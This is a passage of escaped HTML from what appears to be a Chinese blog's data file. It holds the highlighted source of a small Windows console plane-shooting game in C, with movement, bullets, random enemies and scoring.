class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;conio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Esc 27 <span class=\"comment\">//退出</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Up 72 <span class=\"comment\">//上，下，左，右</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Down 80</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Left 75</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Right 77</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Kong 32 <span class=\"comment\">//发射子弹</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> x=<span class=\"number\">10</span>; <span class=\"comment\">//飞机坐标</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> y=<span class=\"number\">18</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> d2=<span class=\"number\">10</span>;<span class=\"comment\">//敌机坐标</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> d1=<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> d=<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> r=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> r1=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> r2=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> t=<span class=\"number\">1</span>; <span class=\"comment\">// 游戏结束</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> f=<span class=\"number\">0</span>; <span class=\"comment\">// 计分数</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> m=<span class=\"number\">3</span>; <span class=\"comment\">// 敌机数</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> j=<span class=\"number\">0</span>; <span class=\"comment\">// 歼敌数</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> p; <span class=\"comment\">// 接受按键</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">kongzhi</span><span class=\"params\">(<span class=\"keyword\">int</span> bx,<span class=\"keyword\">int</span> by)</span></span>;<span class=\"comment\">//声明函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">huatu</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">gotoxy</span><span class=\"params\">(<span class=\"keyword\">int</span> x,<span class=\"keyword\">int</span> y)</span> <span class=\"comment\">//移动坐标</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tCOORD coord;</span><br><span class=\"line\">\tcoord.X=x;</span><br><span class=\"line\">\tcoord.Y=y;</span><br><span class=\"line\">\tSetConsoleCursorPosition( GetStdHandle( STD_OUTPUT_HANDLE ), coord );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">hidden</span><span class=\"params\">()</span><span class=\"comment\">//隐藏光标</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tHANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class=\"line\">\tCONSOLE_CURSOR_INFO cci;</span><br><span class=\"line\">\tGetConsoleCursorInfo(hOut,&amp;cci);</span><br><span class=\"line\">\tcci.bVisible=<span class=\"number\">0</span>;<span class=\"comment\">//赋1为显示，赋0为隐藏</span></span><br><span class=\"line\">\tSetConsoleCursorInfo(hOut,&amp;cci);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//说明</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">shuoming</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\t\\t\\t\\n\\n\\n\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\t\\t\\t方向控制\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t上 ↑\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t下 ↓\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t左 ←\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t右 →\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t子弹 空格\\n\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"\\t\\t\\t退出请按 ESC\\n\"</span>);</span><br><span class=\"line\">\tgotoxy(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//判断我机死没死/游戏结束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">byebye</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>((x==d&amp;&amp;y==r)||(x==d1&amp;&amp;y==r1)||(x==d2&amp;&amp;y==r2))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgotoxy(<span class=\"number\">1</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" !!! 游戏结束 !!!\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"*******************\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\" 您的总得分: %d\\n\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\" 敌机数: %d\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\" 歼敌数: %d\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\" 命中率: %.0f %%\\n\"</span></span><br><span class=\"line\">\t\t<span class=\"string\">\"*******************\\n\"</span>,f,m,j,((<span class=\"keyword\">float</span>)j/(<span class=\"keyword\">float</span>)m)*<span class=\"number\">100</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(!kbhit())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tSleep(<span class=\"number\">500</span>);</span><br><span class=\"line\">\t\t\tgotoxy(<span class=\"number\">1</span>,<span class=\"number\">12</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" 继续请按任意键...\\n\\n\\n\"</span>);</span><br><span class=\"line\">\t\t\tSleep(<span class=\"number\">900</span>);</span><br><span class=\"line\">\t\t\tgotoxy(<span class=\"number\">1</span>,<span class=\"number\">12</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tgotoxy(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\thuatu();</span><br><span class=\"line\">\t\tf=<span class=\"number\">0</span>; m=<span class=\"number\">0</span>; j=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(x&gt;=<span class=\"number\">18</span>) x--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> x++;</span><br><span class=\"line\">\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 计分/更新敌机</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">jifan</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x==d&amp;&amp;y==r)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgotoxy(d,r);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"3\"</span>);</span><br><span class=\"line\">\tSleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">\tgotoxy(d,r); <span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>); f+=<span class=\"number\">2</span>; r=<span class=\"number\">0</span>; j++;&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x==d1&amp;&amp;y==r1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgotoxy(d1,r1);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"1\"</span>);</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">\t\tgotoxy(d1,r1);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\tf+=<span class=\"number\">3</span>; r1=<span class=\"number\">0</span>; j++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x==d2&amp;&amp;y==r2)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgotoxy(d2,r2);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"0\"</span>);</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">\t\tgotoxy(d2,r2);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\tf+=<span class=\"number\">1</span>; r2=<span class=\"number\">0</span>; j++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tgotoxy(<span class=\"number\">26</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" %d \\n\"</span>,f);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//画图</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">huatu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,n;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">20</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(n=<span class=\"number\">0</span>;n&lt;=<span class=\"number\">20</span>;n++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"*\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=<span class=\"number\">19</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(n=<span class=\"number\">1</span>;n&lt;=<span class=\"number\">19</span>;n++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tgotoxy(i,n);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//随机产生敌机</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">dfeiji</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(t)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!r) &#123;d=rand()%<span class=\"number\">17</span>+<span class=\"number\">1</span>; m++;&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!r1) &#123;d1=rand()%<span class=\"number\">17</span>+<span class=\"number\">1</span>; m++;&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!r2) &#123;d2=rand()%<span class=\"number\">17</span>+<span class=\"number\">1</span>; m++;&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(t)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tr++; r1++; r2++;</span><br><span class=\"line\">\t\t\tgotoxy(d,r);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ψ\"</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d1,r1);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"ж\"</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d2,r2);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"♀\"</span>);</span><br><span class=\"line\">\t\t\tSleep(<span class=\"number\">900</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d,r);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d1,r1);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\tgotoxy(d2,r2);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\tkongzhi(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t\tbyebye();</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(r==<span class=\"number\">18</span>) r=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(r1==<span class=\"number\">18</span>) r1=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(r2==<span class=\"number\">18</span>) r2=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(r==<span class=\"number\">0</span>||r1==<span class=\"number\">0</span>||r2==<span class=\"number\">0</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//操控飞机</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">kongzhi</span><span class=\"params\">(<span class=\"keyword\">int</span> bx,<span class=\"keyword\">int</span> by)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (kbhit())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((p=getch())==<span class=\"number\">-32</span>) p=getch();</span><br><span class=\"line\">\t\ta=p;</span><br><span class=\"line\">\t\tgotoxy(<span class=\"number\">22</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span>(a)</span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">//控制方向</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Up:<span class=\"keyword\">if</span> (y!=<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\ty--;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Down:<span class=\"keyword\">if</span> (y!=<span class=\"number\">18</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\ty++;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Left:<span class=\"keyword\">if</span> (x!=<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\tx--;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Right:<span class=\"keyword\">if</span> (x!=<span class=\"number\">18</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\tx++;</span><br><span class=\"line\">\t\t\t\tgotoxy(x,y);</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Kong:</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tbx=y;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span>(by=y;by&gt;<span class=\"number\">1</span>;) <span class=\"comment\">//发射子弹</span></span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tby--;</span><br><span class=\"line\">\t\t\t\t\tgotoxy(x,by);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"θ\"</span>);</span><br><span class=\"line\">\t\t\t\t\tSleep(<span class=\"number\">10</span>);</span><br><span class=\"line\">\t\t\t\t\tgotoxy(x,by);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t\t\t\t\ty=by;</span><br><span class=\"line\">\t\t\t\t\tjifan();</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(r==<span class=\"number\">0</span>||r1==<span class=\"number\">0</span>||r2==<span class=\"number\">0</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\ty=bx;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> Esc:t=<span class=\"number\">0</span>; <span class=\"keyword\">break</span>; <span class=\"comment\">//退出</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">default</span>:<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsrand(time(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">\tshuoming();</span><br><span class=\"line\">\thidden();</span><br><span class=\"line\">\thuatu();</span><br><span class=\"line\">\tgotoxy(x,y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Ж\"</span>);</span><br><span class=\"line\">\tgotoxy(<span class=\"number\">22</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"分数:\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (t)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tkongzhi(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(t)</span><br><span class=\"line\">\t\t\tdfeiji ();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"一个不到300行的C语言打飞机游戏\"><a href=\"#一个不到300行的C语言打飞机游戏\" class=\"headerlink\" title=\"一个不到300行的C语言打飞机游戏\"></a>一个不到300行的C语言打飞机游戏</h3>","more":"<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span 